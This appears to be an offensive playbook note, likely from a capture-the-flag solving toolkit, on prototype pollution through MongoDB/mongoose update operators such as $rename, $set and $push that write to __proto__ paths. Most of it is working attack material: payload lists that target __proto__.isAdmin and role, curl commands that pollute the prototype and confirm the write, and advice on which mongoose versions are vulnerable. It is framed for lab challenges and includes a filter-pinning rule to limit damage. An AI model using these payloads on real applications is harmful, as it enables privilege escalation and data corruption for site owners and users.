# $rename / path-rename operators — the write that never merges

Some stores offer a rename/move primitive: `{"$rename":{"a":"b"}}`
moves field `a`'s value to field `b` — as a DOT-TARGETED write. No
recursive merge needed; the operator walks the path string itself.
When the path is attacker-controlled, `a` is any field and `b` is
`__proto__.x`.

---

## 1. The shape

```js
// mongoose / mongodb-style rename — path strings on both sides
Model.updateOne(filter, {$rename: {a: "__proto__.marker"}})
// mongoose < 8.x (and some update pipelines) accept a dotted target
// the VALUE of 'a' lands at Object.prototype.marker
```

The chain card that proves this in-tree: `htb-secnotes-mongoose-
rename-prototype-pollution-local-gate` — a `$rename` whose target
path was user-shaped, writing a value into the prototype that a
later `obj.isAdmin || ...` style check read.

## 2. The update-document carriers

```json
{"$rename": {"bio": "__proto__.isAdmin"}}
{"$rename": {"bio": "__proto__.role"}}
{"$set": {"__proto__.marker": 1}}
{"$set": {"profile.__proto__.marker": 1}}
{"$unset": {"__proto__.x": 1}}
{"$push": {"__proto__.arr": 1}}
{"$addToSet": {"__proto__.arr": 1}}
{"$inc": {"__proto__.n": 1}}
{"$setOnInsert": {"__proto__.m": 1}}
{"$min": {"__proto__.m": 1}}
{"$max": {"__proto__.m": 1}}
{"$pull": {"__proto__.arr": 1}}
{"$rename": {"a": "constructor.prototype.m"}}
{"$set": {"constructor.prototype.m": 1}}
```

Any update operator that takes a DOT-PATH as the target key is a
path-setter — the store's own path walker resolves `__proto__`.

## 3. The `$set` variant — same primitive, different operator

`$set` writes a value at a dotted path; `{"$set":{"__proto__.m":1}}`
asks the store to resolve `__proto__` as a real path. Whether the
driver/store does depends on version:

- Older mongoose/mongodb drivers resolved dotted paths literally —
  `__proto__.m` walked the prototype.
- Modern drivers/mongoose 6+/mongodb 4+ mostly reject or stringify
  `__proto__` in paths. Try it — one probe — but don't iterate.

## 4. Filter pinning — the blast-radius rule

```json
{"filter": {"_id": "<your-own-doc-id>"}, "$rename": {"bio": "__proto__.m"}}
{"filter": {"owner": "<your-id>", "title": "x"}, "$rename": {"bio": "__proto__.m"}}
```

The update's FILTER decides which document gets the rename. A broad
filter (`{}` or a shared predicate) renames a field on EVERY doc —
on a shared instance that's destructive. Pin to a document you
created; the chain card's blast_radius note says exactly this.

## 5. Other path-rename shapes

```json
// aggregate pipelines with $project/$set/$mergeFields on attacker fields
{"$project": {"x": "__proto__.y"}}
{"$addFields": {"__proto__.m": "$bio"}}

// redis-style RENAME — key rename, different class (not PP)
// but a "move field" REST API that does dst = src value is equivalent:
{"move": {"from": "bio", "to": "__proto__.m"}}
{"copy": {"from": "bio", "to": "__proto__.m"}}
{"set": {"path": "__proto__.m", "value": 1}}
```

## 6. The readback

After the rename/set lands, the write is still only proven when a
FRESH object or a later lookup reads the fallback:

```bash
# 1. pollute via your own document
curl -X POST "$BASE/api/notes/update" -H "Content-Type: application/json" \
  -d '{"filter":{"_id":"<own>"},"$rename":{"bio":"__proto__.ppmarker"}}'
# 2. fresh-object oracle — any endpoint that renders/creates a new object
curl "$BASE/api/notes" | grep -o 'ppmarker'
# or a behavior oracle: a property that changes default handling
```

## 7. Version sanity

```bash
python3 tools/gadget_lookup.py --lockfile <handout>/package-lock.json
# check mongoose/mongodb driver version before burning probes:
#   mongoose 4.x/5.x — literal path resolution, most permissive
#   mongoose 6.x — hardened, some paths rejected
#   mongoose 7.x/8.x — stricter; $rename of __proto__ mostly dead
```

## 8. Ledger

```bash
python3 tools/state.py <chal> --hypothesis "$rename path-writes into prototype"
# refutes when: driver rejects __proto__ in paths; filter pinning
# impossible (no own document); the write lands but nothing reads it
```
